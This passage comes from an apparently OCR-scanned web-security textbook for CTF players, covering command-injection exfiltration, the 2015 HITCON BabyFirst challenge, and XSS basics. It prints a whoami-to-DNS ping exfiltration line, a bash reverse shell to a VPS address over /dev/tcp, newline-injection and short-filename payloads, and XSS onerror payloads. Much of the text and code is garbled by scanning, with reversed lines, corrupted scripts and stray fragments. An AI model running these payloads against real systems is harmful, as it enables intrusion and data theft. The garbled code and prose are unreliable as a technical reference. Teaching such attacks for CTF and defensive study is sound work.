for /F delims=\" $ in (*whoami*) do ping -n 1 $i .xxx, example.com
 Get username.
for /F *delims=^ tokens=2" $i in ('whoami ') do ping -n 1 i . xoox. example.
com
3. Time Blindness
When the network is not working, you can run the data out through a time blind,
borrowing mainly from the inertia of *&&" and *l":; the sleep function can be used
under Linux, while some options are available under Windows. Time-consuming
commands, such as ping -n 5 127.0.0.1.
---
## Page 138
122
qPM peoumapy
?
p. ndl
testass13a0e
Fig, 2.56 Result
4. Write to file, returm twice
You can consider writing the result of executing the command to the Web directory
"> redirect, export the results to the Web directory htp:/www.null.com/exec/3.
and reaccessing the file via the Web to achieve retrieval. For example, through the
php?emd=whoami>test, and then access the exported file http://www.null.com/
again. exec/test to get the result, see Fig. 2.56.
2.2.3Real-life Command Execution Challenges andAnswers
It is rare to test only command injection challenges in CTF competitions, but they are
usually combined into other more technical challenges, such as denylist bypass,
Linux wildcard, etc. The following are some classic challenges.
2.2.3.1 2015 HITCON BabyFirst
The PHP code is as follows.
?php
highlight_file (_FILE__) ;
Sdir = 'sandbox/' . S_SERVER ['REMOTE_ADDR'] ;
if (1file_exists ($dir))
chdir ($dix) ;
mkdix ($dir);
Sargs - $_GEr [′arge′] :
for ($i=0; Si
The problem is to create a sandbox directory for each person and then restrict the
strings by using the regular rule "^\w+S". Since the regular "/^\w+S/" does not
---
## Page 139
2.2 Command Execution Vulnerabilities
123
1313
File: 1
besh -I >4 /dev/tog/192.168.0,9/23333 e41
Fig, 2.57 Execution process
enable multi-line matching, it is possible to execute other commands with “n" (%0a)
line breaks. This allows you to execute the touch abc command alone.
/1 .php?azgs [0] =x$0a&args [1] =touch&args [2] =abc
Then create a new file 1 with the contents set to the bash bounce shell, where
192.168.0.9 is the IP of the VPS server, and 23333 is the bounce port. Then use
Python’s pyftpdlib module to build an anonymous FTP service, see Fig. 2.57.
Finally, use the tp command in the busybox to retrieve the file.
busybox ftpget ip 1
Converting the IP to decimal, i.e., 192.168.0.9 in decimal 3232235529, allows
you to verify that the final requested IP is correct by pinging it.
The conversion script is as follows.
dud >
$ip = *192.168.0.9";
$ip = explode (* . * , Sip) ;
$x = ($ip [0] g to the _ file; write
payload; execute _ to generate the g file, and finally execute the g file to bounce the
shell. Use the following script.
import requests
from ur1lib import quote
from time import sleep
rot48f321b3o61f：/var/
/9o2do4359c2e191fo6f2a122918617d6#
ch
Lf:/var/
Fig, 2.59 Execution process
---
## Page 141
2.2  Command Execution Vulnerabilities
125
payload = [
# generate ~1s -t>g² file
>1s\cr',
'1s>_',
The *> \cr\cr\',
>-t\cr\',
'1a>>_'
^,6ba\cr\ ',
‘,us0 . \cr\',
\\68. \cr\cr',
>16\cr\′,
>2. \cr\cr',
The *> \cr\cr\',
>19\cr\′,
 >rl\cr*,
The ′ >cu’,cr\,cr*,
# exec
'sh g' .
'sh_'.
for i in payload:
((下) aqonb + ,=puodtd-z/ts0oz:*0*o*zt/ / : du,) a5 ·ssanbax = x
assert len (i) 
Ssandbox = 1/www/sandbox/' ,md5 (*orange* . $_SERVER [REMOTE_ADDR]) ;
@mikdir (Ssandbox) ;
@chdir (Ssandbox) ;
if (isset ($_G&T['cmd']) && strlen (S_GEr['cnd']) >_ cannot be used.
Under Linux, **" is executed like “S(dir *)",i.e., the dir file name is executed as a
command.
# generate "g> ht- sl" to file "v*
' >dixr',
'>s1',
‘,ht- ' ,
1 * >v ' ,
The order of t is later than s, so you can find h and add it before t to improve the
priority of the last order of this filename. So, when "*" is executed, the command that
is executed is.
dix s1 g’,> ht - > V
Ultimately, the v file reads.
g> ht- s1
---
## Page 143
2.3 The Magic of XSS
127
# reverse file *v* to file *x", content "ls -th >g"
' >rev' ,
1 *v>x' ,
Next, write a rev file, then use the "*v” command. Since there are only rev and v
files with v, the command will be “rev v*, and then put the contents of the rev v file
into the x file.
Ultimately, the contents of the x file are.
1s -th >g
The payload is written later in the same way as the v1 solution.
2.3 The Magic of XSS
Cross-Site Scripting (XSS) is a type of security vulnerability typically found in web
applications. XSS attacks enable attackers to inject client-side scripts into web pages
viewed by other users. A cross-site scripting vulnerability may be used by attackers
to bypass access controls such as the same-origin policy. Cross-site scripting carried
out on websites accounted for roughly 84% of all security vulnerabilities
Knad tog sue u rn soo Ssx [1lzo un dn sosueus q puunoop
nuisance to significant security risk, depending on the sensitivity of the data handled
by the vulnerable site and the nature of any security mitigation implemented by the
site’s owner network  Wikipedia.
As mentioned above, XSS attacks are a type of code injection. Today, the attack
and defense on the browser has never stopped, many websites have added the HTTP
Only attribute to important cookies, which means that the execution of JavaScript
code has been unable to obtain the user’s login credentials (In other words, it is
impossible to steal cookies through XSS attacks to log in to other people’s accounts).
Although the same-origin policy restricts the ability of JavaScript to execute across
domains, XSS attacks can still be understood as code execution vulnerabilities in the
user’s browser, which can simulate user operations silently (including file uploads
requests, etc). This type challenge of XSS has appeared several times in CTF
competitions.
2.3.1xSS Types
1. Reflected/Stored XSS
According to the triggering characteristics of XSS vulnerability, XSS can be roughly
divided into refected (or non-persistent) XSS and stored (or persistent) XSS.
Reflected XSS usually means that the malicious code is not stored by the server,
---
## Page 144
128
2Advanced Web
Fig, 2.61 A simple reflective XSS example
and the malicious code is submitted through GET/POST every time, and then the
vulnerability is triggered. Stored XSS is just the opposite, the malicious code is
stored by the server and is directly triggered when the page is accessed (such as
leaving a message on the message board, etc.).
Here is a simple reflective XSS example (Fig. 2.61), User input is output directly
in HTML context without any filtering, just like the attacker injects"d the HTML this
is why XSS is also called HTML injection. So that we can inject malicious tags and
codes into the web page to do what we want, as shown in Fig. 2.62.
However, such a payload will be directly blocked by browsers such as Google
Chrome, etc. Because such a request (that is, the JavaScript tag code in the GET
parameter is directly printed in HTML context) was matched by the Google Chrome
browser XSS Auditor, and then the request was directly blocked (this is also the
Google Chrome enhanced protection strategy in recent years Caused, for a long time
before this, attackers could inject XSS malicious code into the web page arbitrarily).
Change to a Firefox browser, the result is shown in Fig. 2.63.
When the input data is spliced into the HTML context, some are output to some
special locations, such as the value of tag attributes and JavaScript variables values.
At this time, the payload can be escaped by closed the tags or the closed statements.
For another example, the input is output to the value of the tag attribute (see
axa o m    o  o,     
malicious code, as shown in Fig. 2.65. In both cases, due to the obvious features,
it will be blocked by Google Chrome XSS Auditor when using Google Chrome
browser.
× vie-40r1270.0.188/: ×+
C ① view-source:127.0.0.18888/xss/1.php7mame+alert(he
be110
fterip>
Fig, 2.62 Result
---
## Page 145
2.3The Magic of XSS
129
hello
Fig, 2.63 Result
+
Fig, 2.64 Input is output to the value of the tag atribute
Fig, 2.65 Result
---
## Page 146
130
qPM peouapy 
Fig, 2.66 Source code
Sname =$_GET[*name*];
title>hello
The third case is that the input is output to a JavaScript variable (see Fig. 2.66).
At this time, the input can be constructed to close the double quotation marks in
the preceding text, and malicious code can be injected at the same time (see
Fig. 2.67).
It can be seen that the source code of the page did not turm red this time, which
means that Google Chrome did not blocked this input and the alert was executed
successfully, as shown in Fig. 2.68.
view-urce:1270.0.1:8888/x:x+
→C view-source:127.0.0.1:8888/xss/3.php?name=aaa*%2balert(11:/
heads
bello
"alert(1)s//°;
12
Fig, 2.67 Result
hello
X
+
127.0.0.1:8888
Fig, 2.68 Result
---
## Page 147
2.3 The Magic of XSS
131
age display
type="text/javascript">
Fig, 2.69 Source code
The first three are the simplest cases in XSS, the input is output on the web page
as it is, and the malicious data in the input is mixed into the JavaScript code to be
executed by carefully constructing the input. This is also the underlying cause of
many vulnerabilities, in other words: the code and data are not well isolated, causing
the attacker to take advantage of the flaws of the system, construct input, and then
execute arbitrary code on the system.
2. DOM XSS
In simple terms, DOM XSS means that after the original JavaScript code in the page
is executed, DOM tree nodes need to be added or elements modified, which will
introduce tainted variables and lead to XSS, as shown in Fig. 2.69. Its function is to
get the picture link in the imgurl parameter, and then splice a picture tag and display
it on the web page, as shown in Fig. 2.70.
The input will not be printed directly to the web page for parsing, the user-
controllable variables will be obtained after the original JavaScript in the web page is
executed, and the malicious code will be spliced and writen into the web page
before it will be triggered, as shown in Fig. 2.71.
pue Sen _Su, au osu peonds Kipeug sem apoo snopoe au eq uaas aq ueo 1
executed.
Fig, 2.70 Result
---
## Page 148
132
2 Advanced Web
Google
Fig, 2.71 Result
3. Other Cases
The key to determining whether the uploaded file can be parsed into HTML code by
the browser is the “Content-Type” element in the HTTP response header, no matter
what suffix the uploaded file is saved on the server. As long as the “Content-type"
returned when accessing the uploaded file is “"text/html", it can be successfully
parsed and executed by the browser. Similarly, the “application/x-shockwave-
flash" of the Flash file can also be injected with XSS code.
In fact, browsers will parse the response as HTML content by default, such as
empty and malformed “Content-type”. Due to the differences between browsers,
-jujuo, Aidu ue “adtuexa og uauuonauo ense at u pannbau s usa auou
type" in Google Chrome will be considered as *text/html", as shown in Fig. 2.72,
and it can also be alert, as shown in Fig. 2.73.
Fig, 2.72 Response
nse Headers
view sour
Connection: Keep-AlLive
Content-Length: 41
Content-Type:
Date: Thu, 30 May 2019 07:22:33 GMT
Keep-Alive: tineout=5, max=1ee
---
## Page 149
2.3 The Magic of XSS
133
Fig, 2.73 Result
127.0.0.1:8888
helloexcel
2.3.2 XSS Tricks
1. Tags that can be used for XSS
Basically all tags can use the “°on” event to trigger malicious code, such as:
ch1 on
ved! ') ">this ls a title
The effect is shown in Fig. 2.74
7 ?g u umous s! ioaa a °en ,8uu, a si auo pasn Kquouo souy
Since there is no picture with a path of “/x" on the web page, an error will be
loaded, the “onerror”? event will be triggered and the code will be executed.
Other common tags are as follows:
→C127.0.0.1:8888/xss/1.html
thisisatitle
127.0.0.1:8888
moved!